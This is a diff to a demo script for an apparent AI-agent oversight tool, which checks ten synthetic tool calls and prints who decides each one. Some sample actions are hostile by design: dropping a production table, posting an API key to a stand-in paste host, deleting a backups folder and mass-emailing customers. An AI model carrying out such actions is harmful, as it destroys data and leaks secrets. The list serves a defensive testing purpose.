@@ -1,48 +1,31 @@
-"""Route 10 synthetic actions and print route + reason for each. No models, no real data."""
+"""Ten made up agent actions, and who gets to decide each one. Run: uv run python demo_cli.py"""
 
-from pathlib import Path
+from oversight import Oversight
 
-from oversight.allocator import Allocator
-from oversight.attention import AttentionTracker
-from oversight.log import DecisionLog
-from oversight.metrics import summarize
-from oversight.policy import Policy
-from oversight.schema import Action
-
-A = Action
 ACTIONS = [
-    A("01", "read_file", "read a synthetic README", "read", "reversible", "self", "none"),
-    A("02", "write_file", "edit a project config", "write", "reversible", "project", "internal"),
-    A("03", "run_shell", "run unit tests in sandbox", "exec", "reversible", "self", "none"),
-    A("04", "http_post", "post synthetic report to internal API", "network", "costly", "org", "internal"),
-    A("05", "pay_invoice", "pay a synthetic vendor invoice", "financial", "costly", "project", "none"),
-    A("06", "send_email", "email synthetic customer list", "comms", "irreversible", "external", "pii"),
-    A("07", "drop_table", "drop synthetic prod table", "admin", "irreversible", "org", "internal"),
-    A("08", "pay_invoice", "pay a second synthetic invoice", "financial", "costly", "project", "none"),
-    A("09", "upload", "upload synthetic API key to pastebin", "network", "irreversible", "external", "secret"),
-    A("10", "delete_repo", "delete synthetic repo", "admin", "irreversible", "project", "none"),
+    ("read_file", {"path": "README.md"}),
+    ("write_file", {"path": "src/config.py", "content": "TIMEOUT = 5"}),
+    ("run_tests", {"suite": "unit"}),
+    ("http_post", {"url": "https://reports.example.net/upload", "body": "weekly summary"}),
+    ("pay_invoice", {"vendor": "Acme Paper Co", "amount": 950}),
+    ("send_email", {"to": "all-customers@example-corp.test", "subject": "Notice", "body": "Service update"}),
+    ("run_sql", {"database": "app_production", "query": "DROP TABLE orders"}),
+    ("pay_invoice", {"vendor": "Acme Paper Co", "amount": 1200}),
+    ("http_post", {"url": "https://paste.example.net/new", "body": "API_KEY=sk_test_synthetic_123"}),
+    ("delete_file", {"path": "/srv/backups/"}),
 ]
 
 
 def main() -> None:
-    root = Path(__file__).parent
-    policy = Policy.load(root / "policies" / "default.yaml")
-    att = AttentionTracker(window_seconds=3600, max_interrupts=2, min_gap_seconds=0)
-    al = Allocator(policy, att)
-    log_path = root / "logs" / "demo.jsonl"
-    log_path.unlink(missing_ok=True)
-    log = DecisionLog(log_path)
-    decisions = []
-    for i, a in enumerate(ACTIONS):
-        if i == 8:
-            att.set_available(False)  # human steps away before action 09
-        d = al.decide(a, now=i * 60)
-        log.append(d)
-        decisions.append(d)
-        flag = " [DEFERRED]" if d.deferred else " [DEGRADED]" if d.degraded else ""
-        print(f"{a.id} {a.description:<42} tier={d.tier:<8} -> {d.route.value}{flag}")
-        print(f"     {d.reasons[-1]}")
-    print("\nsummary:", summarize(decisions))
+    minute = 0
+    guard = Oversight(clock=lambda: minute * 60)
+    for i, (tool, params) in enumerate(ACTIONS, 1):
+        minute = i
+        if i == 9:
+            guard.person_away()
+            print("   (the person steps away)")
+        c = guard.check(tool, params)
+        print(f"{i:2}. {tool:12} {c.risk:9} -> {c.outcome.value:10} {c.reason}")
 
 
 if __name__ == "__main__":
